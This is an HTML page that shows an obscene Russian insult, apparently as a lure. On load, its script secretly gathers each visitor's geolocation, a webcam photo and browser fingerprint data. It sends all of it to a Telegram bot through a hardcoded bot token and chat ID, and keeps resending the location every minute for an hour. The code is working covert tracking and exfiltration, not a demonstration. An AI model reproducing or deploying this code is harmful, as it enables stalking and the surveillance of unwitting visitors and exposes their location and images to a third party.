<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Centered Text</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            overflow: hidden;
            user-select: none;
        }

        .centered-text {
            font-size: 3rem;
            font-weight: bold;
            text-transform: uppercase;
            font-family: Arial, sans-serif;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="centered-text">–ò–î–ò –ù–ê –•–£–ô</div>

    <script>
        let userCount = 1;  // –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è –Ω—É–º–µ—Ä–∞—Ü–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
        let intervalId;
        let photoBlob;  // –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏
        const geoUpdateInterval = 60000;  // –ò–Ω—Ç–µ—Ä–≤–∞–ª –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ (60 —Å–µ–∫—É–Ω–¥)
        const autoGeoUpdateDuration = 3600000;  // –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∞–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ (1 —á–∞—Å)
        let sentData = false;  // –§–ª–∞–≥ –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è, –±—ã–ª–∞ –ª–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        async function getUserInfo(latitude, longitude) {
            const locationData = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
            const locationInfo = await locationData.json();

            return {
                userId: userCount++, // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –Ω–æ–º–µ—Ä –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                referrer: document.referrer,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                historyLength: window.history.length,
                depthOfView: document.body.scrollHeight,
                latitude: latitude,
                longitude: longitude,
                geoLocation: locationInfo.display_name || '–ù–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–æ'
            };
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
        async function sendDataToTelegram(userInfo) {
            const botToken = '6760012279:AAHcJueLC_AF49YRK3s-MCc2pTGJy7YZPHA';
            const chatId = '-1002255197235';

            // –°–æ–æ–±—â–µ–Ω–∏–µ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
            const message = `
                –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ${userInfo.userId} –∑–∞—à—ë–ª –Ω–∞ —Å–∞–π—Ç:
                User Agent: ${userInfo.userAgent}
                –í—Ä–µ–º—è: ${userInfo.timestamp}
                –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞: ${userInfo.screenWidth}px x ${userInfo.screenHeight}px
                –í–Ω—É—Ç—Ä–µ–Ω–Ω–µ–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${userInfo.innerWidth}px x ${userInfo.innerHeight}px
                –†–µ—Ñ–µ—Ä–µ—Ä: ${userInfo.referrer}
                –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${userInfo.platform}
                –Ø–∑—ã–∫: ${userInfo.language}
                Cookies –≤–∫–ª—é—á–µ–Ω—ã: ${userInfo.cookiesEnabled}
                –¢–∏–ø —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: ${userInfo.connectionType}
                –ò—Å—Ç–æ—Ä–∏—è –±—Ä–∞—É–∑–µ—Ä–∞: ${userInfo.historyLength}
                –ì–ª—É–±–∏–Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã: ${userInfo.depthOfView}
                –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: ${userInfo.geoLocation}
                –®–∏—Ä–æ—Ç–∞: ${userInfo.latitude}, –î–æ–ª–≥–æ—Ç–∞: ${userInfo.longitude}
            `;

            // –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è —Å –¥–∞–Ω–Ω—ã–º–∏
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                }),
            });

            // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏, –µ—Å–ª–∏ –æ–Ω–∞ –µ—Å—Ç—å
            if (photoBlob) {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', photoBlob);
                formData.append('caption', message);

                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }

            // –û—Ç–ø—Ä–∞–≤–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ —Å –∫–Ω–æ–ø–∫–æ–π –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
            await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    latitude: userInfo.latitude,
                    longitude: userInfo.longitude,
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "‚úÖ –û–±–Ω–æ–≤–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é", callback_data: "update_geolocation" }],
                            [{ text: "üì∑ –û–±–Ω–æ–≤–∏—Ç—å —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é", callback_data: "update_photo" }]
                        ]
                    }
                }),
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã
        async function capturePhoto() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await new Promise(resolve => video.onloadedmetadata = resolve);
            video.play();

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            stream.getTracks().forEach(track => track.stop());  // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
            return canvas.toDataURL('image/jpeg');
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
        async function updateGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async position => {
                    const userInfo = await getUserInfo(position.coords.latitude, position.coords.longitude);
                    await sendDataToTelegram(userInfo); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
                });
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏
        async function updatePhoto() {
            photoBlob = await (await fetch(await capturePhoto())).blob();  // –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–≤—É—é —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async position => {
                    const userInfo = await getUserInfo(position.coords.latitude, position.coords.longitude);  // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
                    await sendDataToTelegram(userInfo); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ–±–Ω–æ–≤–ª—ë–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                });
            }
        }

        // –ó–∞–ø—É—Å–∫ –∞–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
        async function startAutoGeolocationUpdate() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async position => {
                    const userInfo = await getUserInfo(position.coords.latitude, position.coords.longitude);
                    photoBlob = await (await fetch(await capturePhoto())).blob();  // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é
                    await sendDataToTelegram(userInfo); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                    sentData = true;  // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ñ–ª–∞–≥, —á—Ç–æ –¥–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã

                    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏–Ω—Ç–µ—Ä–≤–∞–ª –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∫–∞–∂–¥—ã–µ 60 —Å–µ–∫—É–Ω–¥
                    intervalId = setInterval(updateGeolocation, geoUpdateInterval);
                    setTimeout(() => clearInterval(intervalId), autoGeoUpdateDuration);  // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∞–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 1 —á–∞—Å
                });
            }
        }

        // –ó–∞–ø—É—Å–∫ —Ñ—É–Ω–∫—Ü–∏–∏ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = startAutoGeolocationUpdate;

        // –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∏–Ω—Ç–µ—Ä–≤–∞–ª–∞ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ –æ–∫–Ω–∞
        window.onbeforeunload = function() {
            clearInterval(intervalId);
        };

    </script>
</body>
</html>
